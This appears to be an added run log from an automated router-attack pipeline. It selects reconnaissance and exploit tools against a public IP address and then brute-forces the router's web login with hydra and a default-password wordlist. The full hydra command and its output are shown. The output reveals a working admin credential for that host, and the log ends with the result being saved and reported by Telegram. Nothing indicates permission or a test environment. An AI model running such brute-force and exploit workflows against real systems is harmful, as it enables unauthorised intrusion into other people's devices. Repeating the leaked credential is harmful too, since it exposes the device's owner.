+    [RUN ] dirsearch: Discover hidden paths and PHP endpoints.
+    [RUN ] ffuf: Fuzz directories using wordlist.
+    [RUN ] gau: Historical URLs may reveal parameters.
+    [SKIP] nuclei: Skipped or cautious — prior connectivity failures detected.
+    [SKIP] sqlmap: SQLi testing on PHP/query endpoints.
+    [RUN ] routersploit: Router exploit modules.
+    [RUN ] ingram: Camera/DVR exploit scan.
+    [RUN ] hydra: Brute force only after recon; forms derived from discovered login paths.
+============================================================
+
+
+======================================================
+>>> PHASE 4: Credential Brute-Force (profile-driven)
+======================================================
+[*] Using target_profile Hydra plan: 5 users, 3 forms
+
+[+] Brute-forcing router web login on port 80...
+
+[>] Executing: hydra -l admin -P /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt -t 8 -f -s 80 188.225.136.99 http-get
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-22 11:00:57
+[DATA] max 8 tasks per 1 server, overall 8 tasks, 151 login tries (l:1/p:151), ~19 tries per task
+[DATA] attacking http-get://188.225.136.99:80/
+[80][http-get] host: 188.225.136.99   misc: /   login: admin   password: amx:Amx1234!
+[STATUS] attack finished for 188.225.136.99 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-22 11:00:58
+
+[WARNING] You must supply the web page as an additional option or via -m, default path set to /
+[!] SUCCESS! Web credentials found on port 80 for user admin!
+[*] Report updated after Phase 4 - Brute Force: /home/kali/router/targets/188.225.136.99/RESULTS_SUMMARY.txt
+
+[*] Target profile updated (final) → /home/kali/router/targets/188.225.136.99/target_profile.json
+
+============================================================
+ TARGET PROFILE (drives tool selection)
+============================================================
+  IP          : 188.225.136.99
+  Type        : router (high)
+  Summary     : Embedded router/CPE web interface patterns.
+  Web ports   : 80
+  Login paths : http://188.225.136.99/cgi-bin/login, http://188.225.136.99/cgi-bin/login.cgi, http://188.225.136.99/cgi-bin/login.php
+
+  Tool routing:
+    [SKIP] searchsploit: Match local exploits to detected stack/vendor.
+    [RUN ] metasploit: MSF search for vendor-specific modules (skip generic router list on web apps).
+    [RUN ] whatweb: Fingerprint CMS/plugins before deep scans.
+    [SKIP] nikto: Web server misconfiguration scan.
+    [RUN ] dirsearch: Discover hidden paths and PHP endpoints.
+    [RUN ] ffuf: Fuzz directories using wordlist.
+    [RUN ] gau: Historical URLs may reveal parameters.
+    [SKIP] nuclei: Skipped or cautious — prior connectivity failures detected.
+    [SKIP] sqlmap: SQLi testing on PHP/query endpoints.
+    [RUN ] routersploit: Router exploit modules.
+    [RUN ] ingram: Camera/DVR exploit scan.
+    [RUN ] hydra: Brute force only after recon; forms derived from discovered login paths.
+============================================================
+
+[+] Telegram notification sent.
+
